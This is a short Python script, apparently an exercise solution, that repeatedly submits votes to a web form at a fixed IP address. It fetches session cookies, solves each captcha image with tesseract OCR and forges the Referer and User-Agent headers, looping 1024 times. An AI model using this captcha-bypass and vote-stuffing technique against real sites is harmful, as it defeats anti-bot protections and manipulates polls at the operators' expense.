#!/usr/bin/python3

import requests
import sys
import subprocess

# Get ID from command line
if len(sys.argv) != 2:
  print("Usage python " + sys.argv[0] + " id")
  quit()

# Check if id is numerical
input = sys.argv[1]

try:
  id = int(input)
except ValueError:
  print("Error: id must be a number")
  quit()

# Set the endpoint
URI     = "http://158.69.76.135/level3.php"
CAPTCHA = "http://158.69.76.135/captcha.php"

headers = {'Referer': URI, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
payload = {'id': id, 'holdthedoor': 'Submit+Query', 'key': '', 'captcha': ''}

for i in range(0, 1024):
  # Get cookie
  cookies = requests.get(URI).cookies

  # Get captcha png
  req = requests.get(CAPTCHA, cookies=cookies, stream=True)

  # Save image png into file
  open_img = open('captcha.png', 'wb')
  open_img.write(req.content)
  open_img.close()

  # Execute external OCR program
  ocr_text = subprocess.check_output("tesseract captcha.png stdout", shell=True).strip()

  # Build POST request
  payload['captcha'] = ocr_text
  payload['key'] = cookies['HoldTheDoor']

  # Send POST request
  response = requests.post(URI, data=payload, headers=headers, cookies=cookies)
  print ("POST " + str(i + 1) + " HTTP result: " + str(response) + "OCR text: " + ocr_text)
